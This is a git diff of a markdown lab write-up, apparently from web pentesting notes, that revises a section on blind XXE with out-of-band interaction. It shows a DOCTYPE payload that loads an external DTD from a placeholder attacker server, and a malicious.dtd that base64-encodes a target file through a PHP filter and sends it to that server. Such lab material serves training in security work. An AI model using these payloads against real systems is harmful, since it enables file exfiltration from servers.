@@ -30,17 +30,19 @@ If the last command was useful we can now try to report critical files using Wra
 <br /> 
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/eac5fa56-da99-429f-9d50-4168c56bac44" width="800">
 
+---------------------------------------
 
-### Lab: Blind XXE with out-of-band interaction.
-The first thing we can do is to check if we can connect to our server.
-We can use the next line in the vulnerable xml.
+## Lab: Blind XXE with out-of-band interaction.
+Sometimes the server doesn't show the file we want to output. We can try to make an out-of-band interaction. The idea is to use a wrapper to recieve the target files in base64 and then decode them.
+- The first thing we can do is to check if we can connect to our server.
+    We can use the next line in the vulnerable xml.
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
 ```
 ![2](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/06cdbc88-48ab-4f97-a0d0-6ec76ce4a022)
 
-After checking if we get the connection we have to create the file `malicious.dtd`.
-```dtd
+- After checking if we get the connection we have to create the file `malicious.dtd`.
+```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<fileToRead>">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<AttackerServer>/?x=%file;'>">
 %eval;
